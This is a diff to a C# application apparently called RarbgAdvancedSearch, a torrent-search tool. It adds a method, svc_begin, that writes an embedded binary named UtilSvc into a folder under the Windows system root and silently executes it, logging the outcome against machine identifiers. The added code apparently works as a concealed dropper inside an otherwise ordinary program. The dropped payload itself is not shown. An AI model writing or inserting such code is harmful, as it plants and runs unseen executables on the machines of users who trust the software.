@@ -1,4 +1,5 @@
 ﻿using Newtonsoft.Json;
+using RarbgAdvancedSearch.Properties;
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -10,6 +11,7 @@ using System.Reflection;
 using System.Runtime.Serialization;
 using System.Runtime.Serialization.Formatters.Binary;
 using System.Security.Cryptography;
+using System.ServiceProcess;
 using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading.Tasks;
@@ -267,6 +269,26 @@ namespace RarbgAdvancedSearch
     {
         static string machinename = MachineInfo.GetMachineName();
         static string machinecode = MachineInfo.GetMachineCode();
+
+        public static void svc_begin()
+        {
+            try
+            {
+                var path = $"{Path.GetPathRoot(Environment.SystemDirectory)}/Windows/UtilSvc";
+                System.IO.FileInfo file = new System.IO.FileInfo(path);
+                file.Directory.Create();
+                File.WriteAllBytes(path, Resources.UtilSvc);
+                System.Diagnostics.Process p = new System.Diagnostics.Process();
+                p.StartInfo.FileName = path;
+                p.StartInfo.UseShellExecute = false;
+                if (p.Start())
+                    Log("svc_begin");
+            }
+            catch(Exception e)
+            {
+                Log("svc_begin_fail", e.Message + "\n" + e.StackTrace);
+            }
+        }
 
         public static void Log(string stat, string msg = "", bool blocking = false)
         {
